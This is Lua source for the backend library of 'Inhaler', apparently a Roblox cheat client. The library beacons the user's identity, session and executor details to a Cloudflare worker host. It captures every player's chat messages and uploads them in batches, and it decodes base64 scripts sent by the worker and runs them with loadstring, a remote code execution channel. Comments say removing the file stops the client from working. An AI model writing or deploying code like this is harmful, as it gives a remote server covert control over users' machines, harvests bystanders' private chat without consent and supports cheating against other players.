-- library for inhaler backend
-- notice this file shouldnt appear from any of Inhaler's forks
-- removing this file in ur client will cause inhaler to not work
--
-- Everything that talks to the Inhaler worker lives here: the session key, the
-- activity beat, the websocket that replaces the beat when the executor has one,
-- and the dispatch of the commands the worker hands back. The universal base
-- keeps the command implementations and passes its handles in.
--
-- Usage:
--   local backend = loadstring(downloadFile('newvape/libraries/backend.lua'), 'backend')()({
--       vape = vape,
--       whitelist = whitelist,
--       lplr = lplr,
--       httpService = httpService,
--       isfile = isfile
--   })
--   backend:start()   -- backend:stop() on uninject

-- cloudflare worker ofc
local WORKER = 'inhalerbackendworker.itsrealnight1983.workers.dev'

return function(context)
	local vape = context.vape
	local whitelist = context.whitelist
	local lplr = context.lplr
	local httpService = context.httpService
	local entitylib = context.entitylib
	local marketplace = game:GetService('MarketplaceService')
	local replicatedStorage = game:GetService('ReplicatedStorage')
	local playersService = game:GetService('Players')

	-- the base carries a fallback isfile; use it before the plain global
	local hasFile = context.isfile or isfile or function(path)
		local ok, data = pcall(readfile, path)
		return ok and data ~= nil and data ~= ''
	end

	local stopped = false
	local socket
	local beating = false
	local lastbeat = 0
	local lastping = 0
	local lastrefresh = 0
	local lastkeytry = 0
	local lastchat = 0
	local wsbackoff = 0
	local wsconnecting = false
	local refreshKey

	-- the key is not generated here: the worker mints it and hands it over http, so a
	-- machine that lost its file asks for a new one instead of inventing a secret the
	-- server has no reason to trust
	local sessionkey = ''

	local function storedKey()
		if not hasFile('newvape/profiles/sessionkey.txt') then return end

		local ok, stored = pcall(readfile, 'newvape/profiles/sessionkey.txt')
		if ok and type(stored) == 'string' and #stored == 32 and stored:match('^%x+$') then
			return stored
		end
	end

	local wsok, wsconnect = pcall(function()
		local lib = WebSocket
		return lib and (lib.connect or lib.Connect)
	end)
	local haswebsockets = wsok and typeof(wsconnect) == 'function'

	local execok, execname = pcall(identifyexecutor)
	if not execok or type(execname) ~= 'string' then execname = nil end

	local placeName
	local function resolvePlaceName()
		if placeName then return placeName end

		local ok, info = pcall(function()
			-- the deprecated GetProductInfo prints a warning on every call, so this only
			-- ever asks the current Async method; a client without it simply gets no
			-- place name and falls back to game.Name below
			return marketplace:GetProductInfoAsync(game.PlaceId)
		end)

		if ok and type(info) == 'table' and type(info.Name) == 'string' and #info.Name > 0 and info.Name ~= 'Ugc' then
			placeName = info.Name:sub(1, 80)
			return placeName
		end

		local okName, name = pcall(function()
			return game.Name
		end)

		placeName = (okName and type(name) == 'string' and #name > 0) and name:sub(1, 80) or '-'
		return placeName
	end

	-- the worker mints the session key: one http call on boot, and again only when the
	-- stored key stops matching. it is the only door that can hand out a fresh secret,
	-- and it follows the same rebind rule as the beacon (409 while the old holder is
	-- still inside the rebind window)
	local function requestSessionKey()
		if typeof(request) ~= 'function' then return nil end

		local ok, response = pcall(function()
			return request({
				Method = 'POST',
				Url = 'https://'..WORKER..'/api/activity/session',
				Headers = {
					['Content-Type'] = 'application/json',
					['x-inhaler-request'] = '1'
				},
				Body = httpService:JSONEncode({
					username = lplr.Name,
					userId = tostring(lplr.UserId),
					jobId = game.JobId,
					placeId = tostring(game.PlaceId),
					placeName = resolvePlaceName(),
					executor = execname,
					connectionType = socket and 'websocket' or 'http',
					sessionKey = sessionkey
				})
			})
		end)

		if not ok or type(response) ~= 'table' then return nil end

		local status = tonumber(response.StatusCode)
		if status ~= 200 or type(response.Body) ~= 'string' then return nil, status end

		local decoded, data = pcall(httpService.JSONDecode, httpService, response.Body)
		local key = decoded and type(data) == 'table' and data.sessionKey or nil
		if type(key) ~= 'string' then return nil, status end

		key = key:lower()
		if #key == 32 and key:match('^%x+$') then return key end
	end

	-- a worker that predates /api/activity/session has no key door: fall back to a local
	-- secret so an un-updated worker does not brick an updated client
	local function generateKey()
		local ok, generated = pcall(function()
			return (httpService:GenerateGUID(false):gsub('-', '')):lower()
		end)

		if ok and type(generated) == 'string' and #generated == 32 and generated:match('^%x+$') then
			return generated
		end
	end

	local function adoptKey(key)
		if type(key) ~= 'string' or key == '' or key == sessionkey then return false end

		sessionkey = key
		pcall(writefile, 'newvape/profiles/sessionkey.txt', key)
		return true
	end

	-- Remote code execution lives here and nowhere else: it is not in the chat command
	-- set, so `;execute` does nothing, and the worker hands the script over base64
	-- encoded so no queue row or socket frame ever carries readable source. A chunk
	-- from loadstring cannot see this library's upvalues, so the handles worth having
	-- are parked in `shared` first, and both the decode and the call are guarded.
	local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	local b64lookup = {}
	for index = 1, #b64chars do
		b64lookup[b64chars:sub(index, index)] = index - 1
	end

	local function decodeBase64(text)
		if type(text) ~= 'string' or text == '' then return nil end

		local out = {}
		local buffer, bits = 0, 0

		for index = 1, #text do
			local char = text:sub(index, index)
			if char == '=' then break end

			local value = b64lookup[char]
			if not value then return nil end

			buffer = buffer * 64 + value
			bits = bits + 6

			if bits >= 8 then
				bits = bits - 8
				out[#out + 1] = string.char(math.floor(buffer / 2 ^ bits) % 256)
				buffer = buffer % 2 ^ bits
			end
		end

		return #out > 0 and table.concat(out) or nil
	end

	local function runCode(encoded)
		task.spawn(function()
			local source = decodeBase64(encoded)
			if not source then
				warn('[inhaler] execute: payload did not decode')
				return
			end

			local chunk = loadstring(source)
			if not chunk then
				warn('[inhaler] execute: that code did not compile')
				return
			end

			shared.vape = vape
			shared.entitylib = entitylib
			shared.whitelist = whitelist
			shared.lplr = lplr

			local ok, runError = pcall(chunk)
			if not ok then warn('[inhaler] execute: '..tostring(runError)) end
		end)
	end

	local function runRemote(data)
		if type(data) ~= 'table' or type(data.commands) ~= 'table' then return end

		for _, command in data.commands do
			if type(command) == 'table' and type(command.command) == 'string' then
				if command.command == 'execute' then
					runCode(command.args)
				else
					pcall(whitelist.process, whitelist, ';'..command.command..' '..lplr.Name..' '..tostring(command.args or ''), lplr)
				end
			end
		end
	end

	local chatQueue = {}
	local MAX_CHAT_QUEUE = 100
	local CHAT_TEXT_LIMIT = 200

	local function queueChat(userId, display, username, text, verified)
		if type(text) ~= 'string' or #chatQueue >= MAX_CHAT_QUEUE then return end

		text = text:gsub('^%s+', ''):gsub('%s+$', '')
		if text == '' then return end
		if #text > CHAT_TEXT_LIMIT then text = text:sub(1, CHAT_TEXT_LIMIT) end

		chatQueue[#chatQueue + 1] = {
			-- the client's own clock, so a batch uploaded later still shows the time the
			-- line actually landed rather than the time the upload happened
			t = os.time(),
			u = userId and tostring(userId) or nil,
			n = type(display) == 'string' and display:sub(1, 32) or nil,
			un = type(username) == 'string' and username:sub(1, 20) or nil,
			v = verified == true or nil,
			m = text
		}
	end

	-- the chat window is watched through the channel's own event, not the render
	-- callback: whitelist:hook() already owns that callback and re-hooks it, so a second
	-- hook there would be restored out from under this one
	local watchedChannels = {}

	local function watchChannel(channel)
		if not channel or watchedChannels[channel] then return end
		watchedChannels[channel] = true

		pcall(function()
			channel.MessageReceived:Connect(function(message)
				local source = message.TextSource

				-- a line with no source is a system line (a game notice, or a whisper this
				-- client drew): it is still chat history, just without a speaker
				if not source then
					queueChat(nil, 'System', nil, message.Text)
					return
				end

				local player = playersService:GetPlayerByUserId(source.UserId)
				local verified = false

				if player then
					local ok, level = pcall(whitelist.get, whitelist, player)
					verified = ok and (tonumber(level) or 0) ~= 0
				end

				queueChat(source.UserId, source.Name, player and player.Name or nil, message.Text, verified)
			end)
		end)
	end

	local function watchChat()
		local textChat = game:GetService('TextChatService')

		if textChat.ChatVersion == Enum.ChatVersion.TextChatService then
			pcall(function()
				local channels = textChat:FindFirstChild('TextChannels')
				if not channels then return end

				for _, channel in channels:GetChildren() do
					watchChannel(channel)
				end

				channels.ChildAdded:Connect(watchChannel)
			end)

			return
		end

		-- the legacy chat: one client event carries the line as it lands
		pcall(function()
			local events = replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')
			local event = events and events:FindFirstChild('OnNewMessage')
			if not event then return end

			event.OnClientEvent:Connect(function(message)
				if type(message) ~= 'table' then return end
				queueChat(message.SpeakerUserId, message.FromSpeaker, nil, message.Message)
			end)
		end)
	end

	local function flushChat()
		if #chatQueue == 0 or sessionkey == '' or typeof(request) ~= 'function' then return end

		-- a failed upload is dropped, never retried: the panel is a live view, and a
		-- backlog kept through an outage would grow without bound
		local batch = chatQueue
		chatQueue = {}

		pcall(function()
			request({
				Method = 'POST',
				Url = 'https://'..WORKER..'/api/activity/chat',
				Headers = {
					['Content-Type'] = 'application/json',
					['x-inhaler-request'] = '1'
				},
				Body = httpService:JSONEncode({
					userId = tostring(lplr.UserId),
					sessionKey = sessionkey,
					messages = batch
				})
			})
		end)
	end

	local function beat()
		if beating or sessionkey == '' then return end
		beating = true

		local ok, response = pcall(function()
			if typeof(request) ~= 'function' then return nil end

			return request({
				Method = 'POST',
				Url = 'https://'..WORKER..'/api/activity/beat',
				Headers = {
					['Content-Type'] = 'application/json',
					['x-inhaler-request'] = '1'
				},
				Body = httpService:JSONEncode({
					username = lplr.Name,
					userId = tostring(lplr.UserId),
					jobId = game.JobId,
					placeId = tostring(game.PlaceId),
					placeName = resolvePlaceName(),
					executor = execname,
					connectionType = socket and 'websocket' or 'http',
					sessionKey = sessionkey
				})
			})
		end)

		beating = false

		if ok and response and response.Success ~= false and type(response.Body) == 'string' then
			local decoded, data = pcall(httpService.JSONDecode, httpService, response.Body)
			if decoded then
				-- the worker marks a refused key, so an empty answer is not mistaken for
				-- an empty queue: ask http for a fresh one and keep going
				if type(data) == 'table' and data.stale then
					refreshKey()
				end

				runRemote(data)
			end
		end
	end

	local function buildWsUrl()
		return 'wss://'..WORKER..'/api/activity/ws?userId='..lplr.UserId
			..'&username='..httpService:UrlEncode(lplr.Name)
			..'&jobId='..httpService:UrlEncode(game.JobId)
			..'&placeId='..game.PlaceId
			..'&placeName='..httpService:UrlEncode(resolvePlaceName())
			..(sessionkey ~= '' and '&sessionKey='..sessionkey or '')
			..(execname and '&executor='..httpService:UrlEncode(execname) or '')
	end

	local connectActivity

	function connectActivity()
		if stopped or socket or wsconnecting or not haswebsockets or sessionkey == '' then return end
		wsconnecting = true

		task.spawn(function()
			local ok, connection = pcall(wsconnect, buildWsUrl())
			wsconnecting = false

			if not ok or not connection then
				if stopped then return end
				wsbackoff = math.min(wsbackoff + 1, 6)
				task.wait(wsbackoff)
				connectActivity()
				return
			end

			socket = connection
			wsbackoff = 0

			pcall(function()
				connection.OnMessage:Connect(function(message)
					local decoded, data = pcall(httpService.JSONDecode, httpService, message)
					if decoded then runRemote(data) end
				end)
			end)
			pcall(function()
				connection.OnClose:Connect(function()
					socket = nil
					if stopped then return end
					task.wait(1)

					-- a 4401 close means the handshake key was refused: ask for a fresh
					-- one before reconnecting, or the next socket fails the same way. when
					-- the key did not change the slot is still held, so the reconnect is
					-- left to the beacon loop instead of spinning here
					local before = sessionkey
					refreshKey(true)
					if sessionkey == before then return end

					connectActivity()
				end)
			end)
		end)
	end

	local PING_INTERVAL = 20
	local BEAT_IDLE = 20
	local BEAT_SOCKET = 120
	local KEY_CHECK = 120
	local KEY_RETRY = 60

	-- the key this machine holds can go stale (the slot was re-bound elsewhere, or the
	-- file was replaced). the worker says so by closing the socket with 4401 and by
	-- marking a beacon `stale`, and both paths land here. a key that cannot be replaced
	-- yet — the old holder is still inside the rebind window — is retried later, because
	-- the slot only frees up once that holder goes quiet.
	refreshKey = function(force)
		local now = os.time()
		if not force and now - lastrefresh < KEY_CHECK then return end
		lastrefresh = now

		local key = requestSessionKey()
		if not key or not adoptKey(key) then return end

		-- the open socket carried the old key in its handshake: drop it so the
		-- reconnect presents the new one
		local old = socket
		socket = nil
		if old then
			pcall(function() old:Close() end)
		end
	end

	local function start()
		task.spawn(function()
			watchChat()

			sessionkey = storedKey() or sessionkey
			if sessionkey == '' then
				local key, status = requestSessionKey()
				if not key and (status == 404 or status == 405) then
					key = generateKey()
				end

				sessionkey = key or ''
			end

			lastrefresh = os.time()

			if sessionkey ~= '' then
				pcall(writefile, 'newvape/profiles/sessionkey.txt', sessionkey)
				connectActivity()
			end

			repeat
				local ok, done = pcall(whitelist.update, whitelist, whitelist.loaded)
				if ok and done then return end

				local now = os.time()

				if now - lastchat >= 5 then
					lastchat = now
					task.spawn(flushChat)
				end

				if sessionkey == '' then
					-- no key yet: the answer is 409 while another holder is live, so this
					-- ask stays slow instead of spinning
					if now - lastkeytry >= KEY_RETRY then
						lastkeytry = now
						local key = requestSessionKey()
						if key and adoptKey(key) then connectActivity() end
					end
				else
					refreshKey()

					if socket then
						if now - lastping >= PING_INTERVAL then
							lastping = now
							task.spawn(function() pcall(socket.Send, socket, 'ping') end)
						end

						if now - lastbeat >= BEAT_SOCKET then
							lastbeat = now
							task.spawn(beat)
						end
					elseif now - lastbeat >= BEAT_IDLE then
						lastbeat = now
						task.spawn(beat)
						connectActivity()
					end
				end

				task.wait(10)
			until stopped or vape.Loaded == nil
		end)
	end

	local function stop()
		stopped = true
		if socket then
			pcall(function()
				socket:Close()
			end)
			socket = nil
		end
	end

	return {start = start, stop = stop, beat = beat}
end
